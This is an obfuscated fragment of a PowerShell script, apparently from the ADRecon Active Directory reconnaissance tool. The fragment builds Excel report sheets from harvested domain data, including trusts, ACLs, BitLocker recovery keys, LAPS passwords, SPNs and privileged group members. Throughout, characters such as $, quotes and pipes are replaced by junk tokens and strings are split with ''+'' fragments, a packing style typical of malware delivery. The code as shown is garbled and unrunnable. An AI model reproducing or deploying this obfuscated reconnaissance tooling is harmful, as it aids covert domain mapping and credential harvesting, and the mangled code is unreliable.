    5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
    5I7ELchart = 5I7ELworksheet.Shapes.AddChart().Chart
    
    5I7ELchart.chartType = [int]([Microsoft.Office.Interop.Excel.XLChartType]::5I7ELChartType)
    5I7ELchart.ApplyLayout(5I7ELChartLayout)
    If (5I7ELnull -eq 5I7ELChartData)
    {
        If (5I7ELnull -eq 5I7ELStartRow)
        {
            5I7ELstart = 5I7ELworksheet.Range(I2ajA1I2aj)
        }
        Else
        {
            5I7ELstart = 5I7ELworksheet.Range(5I7ELStartRow)
        }
        
        5I7ELX = 5I7ELworksheet.Range(5I7ELstart,5I7ELstart.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        If (5I7ELnull -eq 5I7ELStartColumn)
        {
            5I7ELstart = 5I7ELworksheet.Range(I2ajB1I2aj)
        }
        Else
        {
            5I7ELstart = 5I7ELworksheet.Range(5I7ELStartColumn)
        }
        
        5I7ELY = 5I7ELworksheet.Range(5I7ELstart,5I7ELstart.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        5I7ELChartData = 5I7ELworksheet.Range(5I7ELX,5I7ELY)

        Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELX
        Remove-Variable X
        Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELY
        Remove-Variable Y
        Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELstart
        Remove-Variable start
    }
    5I7ELchart.SetSourceData(5I7ELChartData)
    
    5I7ELchart.PlotBy = [Microsoft.Office.Interop.Excel.XlRowCol]::xlColumns
    5I7ELchart.seriesCollection(1).Select() Ok6rl Out-Null
    5I7ELchart.SeriesCollection(1).ApplyDataLabels() Ok6rl out-Null
    
    5I7ELchart.HasTitle = 5I7ELTrue
    5I7ELchart.ChartTitle.Text = 5I7ELChartTitle
    
    5I7ELtemp = 5I7ELworksheet.Range(5I7ELRangetoCover)
    
    5I7ELchart.parent.top = 5I7ELtemp.Top
    5I7ELchart.parent.left = 5I7ELtemp.Left
    5I7ELchart.parent.width = 5I7ELtemp.Width
    If (5I7ELChartTitle -ne I2ajPrivileged Groups in ADI2aj)
    {
        5I7ELchart.parent.height = 5I7ELtemp.Height
    }
    
    5I7ELexcel.ScreenUpdating = 5I7ELtrue
    5I7ELexcel.DisplayAlerts = 5I7ELtrue

    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELchart
    Remove-Variable chart
    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELChartData
    Remove-Variable ChartData
    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELtemp
    Remove-Variable temp
    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelSort
{

    param (
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELColumnName
  '+'  )

    5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
    5I7ELworksheet.Activate();

    5I7ELExcelColumn = (5I7ELworksheet.Columns.Find(5I7ELColumnName))
    If (5I7ELExcelColumn)
    {
        If (5I7ELExcelColumn.Text -ne 5I7ELColumnName)
        {
            5I7ELBeginAddress = 5I7ELExcelColumn.Address(0,0,1,1)
            5I7ELEnd = 5I7ELFalse
            Do {
                
                5I7ELExcelColumn = (5I7ELworksheet.Columns.FindNext(5I7ELExcelColumn))
                5I7ELAddress = 5I7ELExcelColumn.A'+'ddress(0,0,1,1)
                If ( (5I7ELAddress -eq 5I7ELBeginAddress) -or (5I7ELExcelColumn.Text -eq 5I7ELColumnName) )
                {
                    5I7ELEnd = 5I7ELTrue
                }
            } Until (5I7ELEnd -eq 5I7ELTrue)
        }
        If (5I7ELExcelColumn.Text -eq 5I7ELColumnName)
        {
            
            5I7ELworkSheet.ListObjects.Item(1).Sort.SortFields.Clear()
            5I7ELworkSheet.ListObjects.Item(1).Sort.SortFields.Add(5I7ELExcelColumn) Ok6rl Out-Null
            5I7ELworksheet.ListObjects.Item(1).Sort.Apply()
        }
        Else
        {
            Write-Verbose I2aj[Get-ADRExcelSort] 5I7EL(5I7ELColumnName) not found in the 5I7EL(5I7ELworksheet.Name) worksheet.I2aj
        }
    }
    Else
    {
        Write-Verbose I2aj[Get-ADRExcelSort] 5I7EL(5I7ELColumnName) not found in the 5I7EL(5I7ELworksheet.Name) worksheet.I2aj
    }
    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
    Remove-Variable worksheet
}

Function Export-ADRExcel
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELExcelPath
    )

    5I7ELExcelPath = 5I7EL((Convert-Path 5I7ELExcelPath).TrimEnd(I2ajCOlhgI2aj))
    5I7ELReportPath = -join(5I7ELExcelPath,JQTOyCOlhgJQTOy,JQTOyCSV-FilesJQTOy)
    If (!(Test-Path 5I7ELReportPath))
    {
        Write-Warning I2aj[Export-ADRExcel] Could not locate the CSV-Files directory ... ExitingI2aj
        Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        Return 5I7ELnull
    }
    Get-ADRExcelComObj
    If (5I7ELexcel)
    {
        Write-Output I2aj[*] Generating ADRecon-Report.xlsxI2aj

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyAboutADRecon.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName

            5I7ELworkbook.Worksheets.Item(1).Name = I2ajAbout ADReconI2aj
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(3,2) , I2ajhttps://github.com/adrecon/ADReconI2aj, I2ajI2aj , I2ajI2aj, I2ajgithub.com/adrecon/ADReconI2aj) Ok6rl Out-Null
            5I7ELworkbook.Worksheets.Item'+'(1).UsedRange.EntireColumn.AutoFit() Ok6rl Out-Null
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyForest.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajForestI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyDomain.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajDomainI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            5I7ELDomainObj = Import-CSV -Path 5I7ELADFileName
            Remove-Variable ADFileName
            5I7ELDomainName = -join(5I7ELDomainObj[0].Value,I2aj-I2aj)
            Remove-Variable DomainObj
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyTrusts.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajTrustsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOySubnets.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajSubnetsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOySites.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajSitesI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOySchemaHistory.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajSchemaHistoryI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyFineGrainedPasswordPolicy.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajFine Grained Password PolicyI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyDefaultPasswordPolicy.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajDefault Password PolicyI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName

            5I7ELexcel.ScreenUpdating = 5I7ELfalse
            5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
            
            5I7ELworksheet.Range(I2ajB2:G10I2aj).HorizontalAlignment = -4108
            

            I2ajA2:B10I2aj, I2ajC2:D10I2aj, I2ajE2:F10I2aj, I2ajG2:G10I2aj Ok6rl ForEach-Object {
                5I7ELworksheet.Range(5I7EL_).BorderAround(1) Ok6rl Out-Null
            }

            
            
            
            

            5I7ELObjValues = @(
            
            I2ajC2I2aj, JQTOy=IF(B2<4,TRUE, FALSE)JQTOy

            
            I2ajC3I2aj, JQTOy=IF(OR(B3=0,B3>90),TRUE, FALSE)JQTOy

            

            
            I2ajC5I2aj, JQTOy=IF(B5<7,TRUE, FALSE)JQTOy

            
            I2ajC6I2aj, JQTOy=IF(B6<>TRUE,TRUE, FALSE)JQTOy

            

            
            I2ajC8I2aj, JQTOy=IF(AND(B8>=1,B8<30),TRUE, FALSE)JQTOy

            
            I2ajC9I2aj, JQTOy=IF(OR(B9=0,B9>6),TRUE, FALSE)JQTOy

            

            
            I2ajE2I2aj, JQTOy=IF(B2<8,TRUE, FALSE)JQTOy

            
            I2ajE3I2aj, JQTOy=IF(OR(B3=0,B3>90),TRUE, FALSE)JQTOy

            
            I2ajE4I2aj, JQTOy=IF(B4=0,TRUE, FALSE)JQTOy

            
            I2ajE5I2aj, JQTOy=IF(B5<13,TRUE, FALSE)JQTOy

            
            I2ajE6I2aj, JQTOy=IF(B6<>TRUE,TRUE, FALSE)JQTOy

            

            

            
            I2ajE9I2aj, JQTOy=IF(OR(B9=0,B9>5),TRUE, FALSE)JQTOy

            

            
            I2ajG2'+'I2aj, JQTOy=IF(B2<24,TRUE, FALSE)JQTOy

            
            I2ajG3I2aj, JQTOy=IF(OR(B3=0,B3>60),TRUE, FALSE)JQTOy

            
            I2ajG4I2aj, JQTOy=IF(B4=0,TRUE, FALSE)JQTOy

            
            I2ajG5I2aj, JQTOy=IF(B5<14,TRUE, FALSE)JQTOy

            
            I2ajG6I2aj, JQTOy=IF(B6<>TRUE,TRUE, FALSE)JQTOy

            
            I2ajG7I2aj, JQTOy=IF(B7<>FALSE,TRUE, FALSE)JQTOy

            
            I2ajG8I2aj, JQTOy=IF(AND(B8>=1,B8<15),TRUE, FALSE)JQTOy

            
            I2ajG9I2aj, JQTOy=IF(OR(B9=0,B9>10),TRUE, FALSE)JQTOy

            
            I2ajG10I2aj, JQTOy=IF(B10<15,TRUE, FALSE)JQTOy )

            For (5I7ELi = 0; 5I7ELi -lt 5I7EL(5I7ELObjValues.Count); 5I7ELi++)
            {
                5I7ELworksheet.Range(5I7ELObjValues[5I7ELi]).FormatConditions.Add([Microsoft.Office.Interop.Excel.XlFormatConditionType]::xlExpression, 0, 5I7ELObjValues[5I7ELi+1]) Ok6rl Out-Null
                5I7ELi++
            }

            I2ajC2I2aj, I2ajC3I2aj , I2ajC5I2aj, I2ajC6I2aj, I2ajC8I2aj, I2ajC9I2aj, I2ajE2I2aj, I2ajE3I2aj , I2ajE4I2aj, I2ajE5I2aj, I2ajE6I2aj, I2ajE9I2aj, I2ajG2I2aj, I2ajG3I2aj, I2ajG4I2aj, I2ajG5I2aj, I2ajG6I2aj, I2ajG7I2aj, I2ajG8I2aj, I2ajG9I2aj, I2ajG10I2aj Ok6rl ForEach-Object {
                5I7ELworksheet.Range(5I7EL_).FormatConditions.Item(1).StopIfTrue = 5I7ELfalse
                5I7ELworksheet.Range(5I7EL_).FormatConditions.Item(1).Font.ColorIndex = 3
            }

            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(1,4) , I2ajhttps://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dssI2aj, I2ajI2aj , I2ajI2aj, I2ajPCI DSS v3.2.1I2aj) Ok6rl Out-Null
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(1,6) , I2ajhttps://acsc.gov.au/infosec/ism/I2aj, I2ajI2aj , I2ajI2aj, I2aj2018 ISM ControlsI2aj) Ok6rl Out-Null
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(1,7) , I2ajhttps://www.cisecurity.org/benchmark/microsoft_windows_serve'+'r/I2aj, I2ajI2aj , I2ajI2aj, I2ajCIS Benchmark 2016I2aj) Ok6rl Out-Null

            5I7ELexcel.ScreenUpdating = 5I7ELtrue
            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
            Remove-Variable worksheet
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyDomainControllers.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajDomain ControllersI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyGroupChanges.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajGroup ChangesI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName I2ajGroup NameI2aj
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyDACLs.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajDACLsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOySACLs.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajSACLsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5'+'I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyGPOs.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajGPOsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOygPLinks.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajgPLinksI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyDNSNodesJQTOy,JQTOy.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajDNS RecordsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyDNSZones.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajDNS ZonesI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyPrinters.'+'csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajPrintersI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyBitLockerRecoveryKeys.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajBitLockerI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyLAPS.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajLAPSI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyComputerSPNs.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajComputer SPNsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName I2ajUserNameI2aj
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyComputers.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajComputersI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileNam'+'e

            Get-ADRExcelSort -ColumnName I2ajUserNameI2aj

            5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
            
            5I7ELworksheet.Select()
            5I7ELworksheet.Application.ActiveWindow.splitcolumn = 1
            5I7ELworksheet.Application.ActiveWindow.splitrow = 1
            5I7ELworksheet.Application.ActiveWindow.FreezePanes = 5I7ELtrue

            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
            Remove-Variable worksheet
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyOUs.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajOUsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyGroups.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajGroupsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName I2ajDistinguishedNameI2aj
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyGroupMembers.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajGroup MembersI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName I2ajGroup NameI2aj
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyUserSPNs.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajUser SPNsI2aj
            Get-ADRExcelImport -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName
        }

        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyUsers.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajUsersI2aj
            Get-ADRExcelImpo'+'rt -ADFileName 5I7ELADFileName
            Remove-Variable ADFileName

            Get-ADRE'+'xcelSort -ColumnName I2ajUserNameI2aj

            5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)

            
            5I7ELworksheet.Select()
            5I7ELworksheet.Application.ActiveWindow.splitcolumn = 1
            5I7ELworksheet.Application.ActiveWindow.splitrow = 1
            5I7ELworksheet.Application.ActiveWindow.FreezePanes = 5I7ELtrue

            5I7ELworksheet.Cells.Item(1,3).Interior.ColorIndex = 5
            5I7ELworksheet.Cells.Item(1,3).font.ColorIndex = 2
            
            5I7ELworksheet.UsedRange.Select() Ok6rl Out-Null
            5I7ELexcel.Selection.AutoFilter(3,5I7ELtrue) Ok6rl Out-Null
            5I7ELworksheet.Cells.Item(1,1).Select() Ok6rl Out-Null
            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
            Remove-Variable worksheet
        }

        
        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyComputerSPNs.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajComputer Role StatsI2aj
            Remove-Variable ADFileName

            5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
            5I7ELPivotTableName = I2ajComputer SPNsI2aj
            Get-ADRExcelPivotTable -SrcSheetName I2ajComputer SPNsI2aj -PivotTableName 5I7ELPivotTableName -PivotRows @(I2ajServiceI2aj) -PivotValues @(I2ajServiceI2aj)

            5I7ELworksheet.Cells.Item(1,1) = I2ajComputer RoleI2aj
            5I7ELworksheet.Cells.Item(1,2) = I2ajCountI2aj

            
            5I7ELworksheet.PivotTables(5I7ELPivotTableName).PivotFields(I2ajServiceI2aj).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,I2ajCountI2aj)

            Get-ADRExcelChart -ChartType I2ajxlColumnClusteredI2aj -ChartLayout 10 -Cha'+'rtTitle I2ajComputer Roles in ADI2aj -RangetoCover I2ajD2:U16I2aj
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(1,4) , I2ajI2aj , I2ajJQTOyComputer SPNsJQTOy!A1I2aj, I2ajI2aj, I2ajRaw DataI2aj) Ok6rl Out-Null
            5I7ELexcel.Windows.Item(1).Displaygridlines = 5I7ELfalse
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
            Remove-Variable worksheet
        }

        
        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyComputers.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajOperating System StatsI2aj
            Remove-Variable AD'+'FileName

            5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
            5I7ELPivotTableName = I2ajOperating SystemsI2aj
            Get-ADRExcelPivotTable -SrcSheetName I2ajComputersI2aj -PivotTableName 5I7ELPivotTableName -PivotRows @(I2ajOperating SystemI2aj) -PivotValues @(I2ajOperating SystemI2aj)

            5I7ELworksheet.Cells.Item(1,1) = I2ajOperating SystemI2aj
            5I7ELworksheet.Cells.Item(1,2) = I2ajCountI2aj

            
            5I7ELworksheet.PivotTables(5I7ELPivotTableName).PivotFields(I2ajOperating SystemI2aj).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,I2ajCountI2aj)

            Get-ADRExcelChart -ChartType I2ajxlColumnClusteredI2aj -ChartLayout 10 -ChartTitle I2ajOperating Systems in ADI2aj -RangetoCover I2ajD2:S16I2aj
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(1,4) , I2ajI2aj , I2ajComputers!A1I2aj, I2ajI2aj, I2ajRaw DataI2aj) Ok6rl Out-Null
            5I7ELexcel.Windows.Item(1).Displaygridlines = 5I7ELfalse
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
            Remove-Variable worksheet
        }

        
        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyGroupMembers.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajPrivileged Group StatsI2aj
            Remove-Variable ADFileName

            5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
            5I7ELPivotTableName = I2ajGroup MembersI2aj
            Get-ADRExcelPivotTable -SrcSheetName I2ajGroup MembersI2aj -PivotTableName 5I7ELPivotTableName -PivotRows @(I2ajGroup NameI2aj)-PivotFilters @(I2ajAccountTypeI2aj) -PivotValues @(I2ajAccountTypeI2aj)

            
            5I7ELworksheet.PivotTables(5I7ELPivotTableName).PivotFields(I2ajAccountTypeI2aj).CurrentPage = I2ajuserI2aj

            5I7ELworksheet.Cells.Item(1,2).Interior.ColorIndex = 5
            5I7ELworksheet.Cells.Item(1,2).font.ColorIndex = 2

            5I7ELworksheet.Cells.Item(3,1) = I2ajGroup NameI2aj
            5I7ELworksheet.Cells.Item(3,2) = I2ajCount (Not-Recursive)I2aj

            5I7ELexcel.ScreenUpdating = 5I7ELfalse
            
            5I7ELPivotTableTemp = (5I7ELworkbook.PivotCaches().Item(5I7ELworkbook.PivotCaches().Count)).CreatePivotTable(I2ajR1C5I2aj,I2ajPivotTableTempI2aj)
            5I7ELPivotFieldTemp = 5I7ELPivotTableTemp.PivotFields(I2ajGroup NameI2aj)
            
            5I7ELPivotFieldTemp.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
            Try
            {
                5I7ELPivotFieldTemp.CurrentPage = I2ajDomain AdminsI2aj
            }
            Catch
            {
                
                5I7ELNoDA = 5I7ELtrue
            }
            If (5I7ELNoDA)
            {
                Try
                {
                    5I7ELPivotFieldTemp.CurrentPage = I2ajAdministratorsI2aj
                }
                Catch
                {
                    
                }
            }
            
            5I7ELPivotSlicer = 5I7ELworkbook.SlicerCaches.Add(5I7ELPivotTableTemp,5I7ELPivotFieldTemp)
            
            5I7ELPivotSlicer.PivotTables.AddPivotTable(5I7ELworksheet.PivotTables(5I7ELPivotTableName))
            
            5I7ELPivotSlicer.Delete()
            
            5I7ELPivotTableTemp.TableRange2.Delete() Ok6rl Out-Null

            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELPivotFieldTemp
            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELPivotSlicer
            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELPivotTableTemp

            Remove-Variable PivotFieldTemp
            Remove-Variable PivotSlicer
            Remove-Variable PivotTableTemp

            I2ajAccount OperatorsI2aj,I2ajAdministratorsI2aj,I2ajBackup OperatorsI2aj,I2ajCert PublishersI2aj,I2ajCrypto OperatorsI2aj,I2ajDnsAdminsI2aj,I2ajDomain AdminsI2aj,I2ajEnterprise AdminsI2aj,I2ajEnterprise Key AdminsI2aj,I2ajIncoming Forest Trust BuildersI2aj,I2ajKey AdminsI2aj,I2ajMicrosoft Advanced Threat Analytics AdministratorsI2aj,I2ajNetwork OperatorsI2aj,I2ajPrint OperatorsI2aj,I2ajProtected UsersI2aj,I2ajRemote Desktop UsersI2aj,I2ajSchema AdminsI2aj,I2ajServer OperatorsI2aj Ok6rl ForEach-Object {
                Try
                {
                    5I7ELworksheet.PivotTables(5I7ELPivotTableName).PivotFields(I2ajGroup NameI2aj).PivotItems(5I7EL_).Visible = 5I7ELtrue
                }
                Catch
                {
                    
                }
            }

            
            5I7ELworksheet.PivotTables(5I7ELPivotTableName).PivotFields(I2ajGroup NameI2aj).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,I2ajCount (Not-Recursive)I2aj)

            5I7ELworksheet.Cells.Item(3,1).Interior.ColorIndex = 5
            5I7ELworksheet.Cells.Item(3,1).font.ColorIndex = 2

            5I7ELexcel.ScreenUpdating = 5I7ELtrue

            Get-ADRExcelChart -ChartType I2ajxlColumnClusteredI2aj -ChartLayout 10 -ChartTitle I2ajPrivileged Groups in ADI2aj -RangetoCover I2ajD2:P16I2aj -StartRow I2ajA3I2aj -StartColumn I2ajB3I2aj
            5I7ELworkbook.Worksheets.Item(1).Hyperlinks.Add(5I7ELworkbook.Worksheets.Item(1).Cells.Item(1,4) , I2ajI2aj , I2ajJQTOyGroup MembersJQTOy!A1I2aj, I2ajI2aj, I2ajRaw DataI2aj) Ok6rl Out-Null
            5I7ELexcel.Windows.Item(1).Displaygridlines = 5I7ELfalse

            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
            Remove-Variable worksheet
        }

        
        5I7ELADFileName = -join(5I7ELReportPath,JQTOyCOlhgJQTOy,JQTOyComputers.csvJQTOy)
        If (Test-Path 5I7ELADFileName)
        {
            Get-ADRExcelWorkbook -Name I2ajComputer StatsI2aj
            Remove-Variable ADFileName

            5I7ELObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            5I7ELObjAttributes.Add(I2ajDelegation TypI2aj,JQTOyI2ajUnconstrainedI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajDelegation TypeI2aj,JQTOyI2ajConstrainedI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajSIDHistoryI2aj,JQTOyI2aj*I2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajDormantI2aj,JQTOyI2ajTRUEI2ajJQTOy)
            5I7ELObjAttributes.Add(I2ajPassword Age (> I2aj'+',JQTOyI2ajTRUEI2ajJQTOy)
   '+'         5I7ELObjAttributes.Add(I2ajms-ds-CreatorSidI2aj,JQTOyI2aj*I2ajJQTOy)

